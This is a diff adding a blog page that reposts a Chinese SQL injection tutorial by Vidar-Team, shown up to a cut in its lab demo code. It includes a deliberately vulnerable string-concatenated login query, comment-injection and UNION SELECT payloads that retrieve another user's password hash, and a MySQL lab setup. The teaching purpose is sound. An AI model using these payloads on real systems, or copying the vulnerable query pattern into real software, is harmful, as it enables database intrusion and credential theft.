@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SQL 注入[](https:&#x2F;&#x2F;hdu-cs.wiki&#x2F;6.计算机安全&#x2F;6.1.1SQL 注入#sql-注入)Author: Liki4 from Vidar-Team Vidar-Team 2023 招新 QQ 群：861507440（仅向校内开放） Vidar-Team 官网：https:&#x2F;&#x2F;vidar.club&#x2F; Vidar-Team 招新报名表：https:&#x2F;&#x2F;reg.vidar.clu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/10/19/SQL%20%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL 注入[](https:&#x2F;&#x2F;hdu-cs.wiki&#x2F;6.计算机安全&#x2F;6.1.1SQL 注入#sql-注入)Author: Liki4 from Vidar-Team Vidar-Team 2023 招新 QQ 群：861507440（仅向校内开放） Vidar-Team 官网：https:&#x2F;&#x2F;vidar.club&#x2F; Vidar-Team 招新报名表：https:&#x2F;&#x2F;reg.vidar.clu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnHiNBWN86AR4AvSSsUVwSWb.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcn8TrpE02fnPV7dFzkmnHiAe.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnbAKreqEeZxOYQuQMtZbd9d.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcniDohuM3F8FbMqz7YSC0Y5g.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnpCCmEi6LIKNi0UqEkXfJ8g.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnbaW15gnJc1O9Iv9WXqJxPc.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnDeDp5yPE7W4KX9ByBl9ovh.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnkwvSnhKBhlHNLOSthgul9d.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcn3kfhJ79ByNML2Z1Q1MwRye.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcn2seUNESHkLC9PYvDp0vFbe.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnJEeAKow3ZhUSvbL4FQXxOh.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnJ3jImTQcMUOWJclTACj74e.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnEDPFbKQ6iaM5WhHWUWmI5d.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnXyMaLh26lkNuAPiQVHuaNg.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcndxf4WEQQQEXspS7GwNKI6J.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnsStdHC5VmBylyx6S7hakEb.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnl67uDDSIdh3J7y7Jxjk0dc.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnrMIc2m6oubxC86CEtw1jMe.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnVRdntvakiTpt7nP8JhKKfc.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnaRtyUGC0sX3btnFIgpDCob.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnbMtjAq8osStjcSbFuIdDSc.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnV68mdIQmovJwczDsOc53gc.png">
+<meta property="og:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnI3jJNlLqq4f7WqRKGEWTeh.png">
+<meta property="article:published_time" content="2023-10-19T12:24:30.921Z">
+<meta property="article:modified_time" content="2023-10-11T14:07:44.389Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\24993\Desktop\%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0\static\boxcnHiNBWN86AR4AvSSsUVwSWb.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-SQL 注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/10/19/SQL%20%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2023-10-19T12:24:30.921Z" itemprop="datePublished">2023-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入"><a href="#SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入" class="headerlink" title="SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入)"></a>SQL 注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-注入)</h1><p>Author: <code>Liki4</code> from Vidar-Team</p>
+<p>Vidar-Team 2023 招新 QQ 群：861507440（仅向校内开放）</p>
+<p>Vidar-Team 官网：<a target="_blank" rel="noopener" href="https://vidar.club/">https://vidar.club/</a></p>
+<p>Vidar-Team 招新报名表：<a target="_blank" rel="noopener" href="https://reg.vidar.club/">https://reg.vidar.club/</a></p>
+<p>本文中所有涉及的代码全部都托管在 <a target="_blank" rel="noopener" href="https://github.com/Liki4/SQLi">https://github.com/Liki4/SQLi</a></p>
+<h2 id="前言-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-前言"><a href="#前言-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-前言" class="headerlink" title="前言[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#前言)"></a>前言[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#前言)</h2><p>在当代优秀年轻程序员设计与编写 Web 应用的时候，或多或少会使用到一种叫数据库的东西，如字面意义，这种东西通常用来储存数据，例如用户的个人信息，账户名称和密码等。</p>
+<p>当然这些东西即便用记事本也可以储存，只需要将数据输出到一个文本文件里，事后需要使用的时候再搜索即可。但当数据量逐渐庞大，又对数据的增删改查有所需求的时候，记事本就显得有些心有余而力不足了。</p>
+<p>于是数据库诞生了，随之诞生了一种名为 SQL 的语言，用以对数据库进行增删改查和更多其他的操作。使用 SQL 语句，可以方便地从数据库中查询出想要的数据，可以方便地找出不同类型数据之间的联系并对他们进行一定的操作。例如当今天你没有做核酸的时候，某些系统就会找出你的个人信息，并对你的健康码进行一个改天换色，同时也将对你的出行码等信息造成影响，这其中所有的过程都离不开 SQL 语句的辛勤付出，因此对其进行研究是非常必要的 :-p</p>
+<p>有关 SQL 语句的基本知识，可以参考 <a target="_blank" rel="noopener" href="https://www.w3schools.com/sql/">SQL Tutorial</a></p>
+<h2 id="简介-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-简介"><a href="#简介-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-简介" class="headerlink" title="简介[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#简介)"></a>简介[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#简介)</h2><p>在旧时代诞生的 Web 应用，不少都直接使用了原始 SQL 语句拼接的方式来完成查询，举个例子</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def check_pass(username, password):</span><br><span class="line">    hash = conn.exec(f&quot;SELECT password FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot;)</span><br><span class="line">    return (sha256(password) == hash)</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3</p>
+<p>这是一个普通 Web 应用里常见的密码校验函数，的伪代码</p>
+<p>从 <code>users</code> 表中查出 <code>username</code> 对应的 <code>password</code> 的哈希值，将其与用户传入的密码哈希值进行比对，若相等则意味着用户传入的密码与数据库中储存的密码相吻合，于是返回准许登录</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnHiNBWN86AR4AvSSsUVwSWb.png"></p>
+<p>那么问题来了，在语句</p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT password FROM users WHERE username = &#x27;&#123;username&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>1</p>
+<p>之中，如果参数 <code>username</code> 未经过校验，直接使用用户传入的原生字符串，会不会出现什么问题呢？</p>
+<p>这就是本篇 SQL 注入要讨论的问题</p>
+<h2 id="SQL-注入中的信息搜集-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入中的信息搜集"><a href="#SQL-注入中的信息搜集-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入中的信息搜集" class="headerlink" title="SQL 注入中的信息搜集[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入中的信息搜集)"></a>SQL 注入中的信息搜集[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-注入中的信息搜集)</h2><h3 id="信息的获取-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-信息的获取"><a href="#信息的获取-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-信息的获取" class="headerlink" title="信息的获取[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#信息的获取)"></a>信息的获取[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#信息的获取)</h3><p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version() 数据库版本</span><br><span class="line">2. user() 数据库用户名</span><br><span class="line">3. database() 数据库名</span><br><span class="line">4. @@datadir 数据库路径</span><br><span class="line">5. @@version_compile_os 操作系统版本</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5</p>
+<h3 id="字符串拼接-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-字符串拼接"><a href="#字符串拼接-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-字符串拼接" class="headerlink" title="字符串拼接[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#字符串拼接)"></a>字符串拼接[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#字符串拼接)</h3><ol>
+<li><code>concat(str1,str2,…)</code> 能够将你查询的字段连接在一起</li>
+<li><code>concat_ws(separator,str1,str2,)</code> 能够自定义分隔符来将你查询的字段链接在一起</li>
+<li><code>group_concat([DISTINCT] column [Order BY ASC/DESC column] [Separator separator])</code></li>
+</ol>
+<p>一般来说这个函数是配合 <code>group by</code> 子句来使用的，但是在 SQL 注入中，我们用他来输出查询出来的所有数据</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id, username, password from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(id,username,password) from users;</span><br><span class="line">+------------------------------+</span><br><span class="line">| concat(id,username,password) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 1DumbDumb                    |</span><br><span class="line">| 2AngelinaI-kill-you          |</span><br><span class="line">| 3Dummyp@ssword               |</span><br><span class="line">| 4securecrappy                |</span><br><span class="line">| 5stupidstupidity             |</span><br><span class="line">| 6supermangenious             |</span><br><span class="line">| 7batmanmob!le                |</span><br><span class="line">| 8adminadmin                  |</span><br><span class="line">| 9admin1admin1                |</span><br><span class="line">| 10admin2admin2               |</span><br><span class="line">| 11admin3admin3               |</span><br><span class="line">| 12dhakkandumbo               |</span><br><span class="line">| 14admin4admin4               |</span><br><span class="line">+------------------------------+</span><br><span class="line">13 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(id,username,password) from users;</span><br><span class="line">+------------------------------+</span><br><span class="line">| concat(id,username,password) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 1DumbDumb                    |</span><br><span class="line">| 2AngelinaI-kill-you          |</span><br><span class="line">| 3Dummyp@ssword               |</span><br><span class="line">| 4securecrappy                |</span><br><span class="line">| 5stupidstupidity             |</span><br><span class="line">| 6supermangenious             |</span><br><span class="line">| 7batmanmob!le                |</span><br><span class="line">| 8adminadmin                  |</span><br><span class="line">| 9admin1admin1                |</span><br><span class="line">| 10admin2admin2               |</span><br><span class="line">| 11admin3admin3               |</span><br><span class="line">| 12dhakkandumbo               |</span><br><span class="line">| 14admin4admin4               |</span><br><span class="line">+------------------------------+</span><br><span class="line">13 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select group_concat(id,username separator &#x27;_&#x27;) from users;</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| group_concat(id,username separator &#x27;_&#x27;)                                                                      |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| 1Dumb_2Angelina_3Dummy_4secure_5stupid_6superman_7batman_8admin_9admin1_10admin2_11admin3_12dhakkan_14admin4 |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67</p>
+<h2 id="前置知识-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-前置知识"><a href="#前置知识-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-前置知识" class="headerlink" title="前置知识[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#前置知识)"></a>前置知识[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#前置知识)</h2><p>接着上一节的节奏走，如果我们传入的 <code>username</code> 参数中有单引号会发生什么呢</p>
+<blockquote>
+<p>以下所举的例子都在 MySQL 5.x 版本完成</p>
+</blockquote>
+<p>现在我们传入 <code>Liki4&#39;</code> 这个字符串</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcn8TrpE02fnPV7dFzkmnHiAe.png" alt="img"></p>
+<p>很遗憾，报错了，这个查询因为 SQL 语句存在语法错误而无法完成。</p>
+<p>那么问题来了，怎么让他不报错的情况下完成查询呢？</p>
+<p>在 MySQL 语句中， <code>#</code> 和 <code>--</code> 代表行间注释，与 C 语言的 <code>//</code> 和 Python 中的 <code>#</code> 是同样的意思。也就是说，一个 MySQL 语句中如果存在 <code>#</code> 和 <code>--</code> ，那么这一行其后的所有字符都将视为注释，不予执行。</p>
+<p>那如果我们传入 <code>Liki4&#39;;#</code> 这个字符串，那么在拼接后的查询又是什么结果呢</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnbAKreqEeZxOYQuQMtZbd9d.png" alt="img"></p>
+<p>很显然， <code>#</code> 号将原本语句的 <code>&#39;;</code> 注释掉了</p>
+<p>而我们传入的字符串构成了全新的语法正确的语句，并完成了一次查询！</p>
+<p>那我们是否可以查询一些… 不属于我们自己的信息呢？答案是可以的。</p>
+<p>例如我们传入一个精心构造的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw_sql_danger&#x27; UNION SELECT password FROM users WHERE username = &#x27;Liki5&#x27;;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcniDohuM3F8FbMqz7YSC0Y5g.png" alt="img"></p>
+<p><strong>真是惊人的壮举！我完全不认识这个叫 Liki5 的家伙，但我居然知道了他的密码对应的哈希值！</strong></p>
+<p><del>那么到这里 SQL 注入你就已经完全学会了，接下来做一些小练习吧。</del></p>
+<p><del>请挖掘 Django ORM 最新版本的注入漏洞并与我分享，我会请你喝一杯奶茶作为谢礼。</del></p>
+<h2 id="SQL-注入入门-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入入门"><a href="#SQL-注入入门-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入入门" class="headerlink" title="SQL 注入入门[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入入门)"></a>SQL 注入入门[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-注入入门)</h2><p>接下来的举例几乎都不会以 Web 的形式出现，虽然你去看别的文档都是起个 Web 应用，但我懒</p>
+<p>反正都是一样的东西，是否以 Web 应用的形式没差，请不要来杠</p>
+<h3 id="SQL-注入的常见类型-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入的常见类型"><a href="#SQL-注入的常见类型-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入的常见类型" class="headerlink" title="SQL 注入的常见类型[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入的常见类型)"></a>SQL 注入的常见类型[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-注入的常见类型)</h3><p>SQL 注入的常见类型分为以下几种，在后面的章节里会慢慢地讲述不同类型的区别和攻击手法</p>
+<p>按照攻击手法来分类可以分为以下几种</p>
+<ol>
+<li>有回显的 SQL 注入</li>
+<li>无回显的 SQL 盲注</li>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+<li>基于报错的 SQL 注入</li>
+<li>堆叠注入</li>
+<li>二次注入</li>
+</ol>
+<p>按照注入点来分类可以分为以下几种</p>
+<ol>
+<li>字符型注入</li>
+<li>数字型注入</li>
+</ol>
+<p>注入点的分类只在于语句构造时微小的区别，因此不作详细的说明</p>
+<p>当然，不同的数据库后端因为其不同的内置函数等差异，有着不同的攻击手法，但都大同小异。</p>
+<p>常见的数据库有下列几个</p>
+<ol>
+<li>MySQL</li>
+<li>MSSQL</li>
+<li>OracleDB</li>
+<li>SQLite</li>
+</ol>
+<p>当然还有一些新兴的<del>前沿科技</del>数据库</p>
+<ol>
+<li>ClickHouse</li>
+<li>PostgreSQL</li>
+</ol>
+<p>还有一些和传统数据库设计理念不一样的 noSQL 数据库</p>
+<ol>
+<li>MongoDB</li>
+<li>AmazonRD</li>
+<li>…</li>
+</ol>
+<p>后续的章节里，会采用入门时最常见的 MySQL 数据库来举例，环境可以用 Docker 简单地创建一个</p>
+<p>yaml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose.yml</span><br><span class="line"># docker-compose up -d --build</span><br><span class="line"></span><br><span class="line">version: &quot;3.8&quot;</span><br><span class="line">services:</span><br><span class="line">    db:</span><br><span class="line">        image: mysql:5.7</span><br><span class="line">        container_name: &quot;mysql5-docker&quot;</span><br><span class="line">        command: --default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --sql-mode=&#x27;&#x27;</span><br><span class="line">        ports:</span><br><span class="line">            - &quot;3305:3306&quot;</span><br><span class="line">        environment:</span><br><span class="line">            - MYSQL_ROOT_PASSWORD=TjsDgwGPz5ANbJUU</span><br><span class="line">        healthcheck:</span><br><span class="line">            test: [&quot;CMD&quot;, &quot;mysqladmin&quot; ,&quot;ping&quot;, &quot;-h&quot;, &quot;localhost&quot;]</span><br><span class="line">            interval: 2s</span><br><span class="line">            timeout: 5s</span><br><span class="line">            retries: 30</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18</p>
+<h3 id="有回显的-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-有回显的-sql-注入"><a href="#有回显的-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-有回显的-sql-注入" class="headerlink" title="有回显的 SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#有回显的-sql-注入)"></a>有回显的 SQL 注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#有回显的-sql-注入)</h3><p>我这里写了一个小 demo 来进行展示，demo 代码如下，为了好看我用 prettytable 格式化了输出</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">from sqlalchemy import create_engine</span><br><span class="line">from prettytable import from_db_cursor</span><br><span class="line"></span><br><span class="line">engine = create_engine(&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;, max_overflow=5)</span><br><span class="line"></span><br><span class="line">def query(username):</span><br><span class="line">    with engine.connect() as con:</span><br><span class="line">        cur = con.execute(f&quot;SELECT * FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot;).cursor</span><br><span class="line">        x = from_db_cursor(cur)</span><br><span class="line">        return(x)    # 返回查询的结果</span><br><span class="line"></span><br><span class="line">def 